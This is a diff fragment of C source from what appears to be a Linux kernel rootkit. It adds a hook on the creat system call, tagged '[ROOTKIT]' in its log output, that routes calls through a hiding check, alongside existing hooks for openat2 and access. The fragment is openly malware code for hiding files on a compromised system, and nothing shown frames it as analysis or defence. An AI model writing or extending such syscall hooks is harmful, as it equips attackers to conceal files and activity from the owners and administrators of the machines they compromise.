@@ -92,6 +92,15 @@ SYSCALL_HOOK_HANDLER4(openat2, orig_openat2, p_regs, int, i32_dfd, const char __
                            tmp_how.flags & O_NOFOLLOW ? AT_SYMLINK_NOFOLLOW : 0);
 }
 
+// sys_creat syscall hook handler
+SYSCALL_HOOK_HANDLER2(creat, orig_creat, p_regs, const char __user *, s_filename, umode_t,
+                      ui16_mode)
+{
+    pr_info("[ROOTKIT] creat(%p, 0%ho)\n", s_filename, ui16_mode);
+
+    return do_check_hidden(orig_creat, p_regs, AT_FDCWD, s_filename, 0);
+}
+
 // sys_access syscall hook handler
 SYSCALL_HOOK_HANDLER2(access, orig_access, p_regs, const char __user *, s_filename, int, i32_mode)
 {
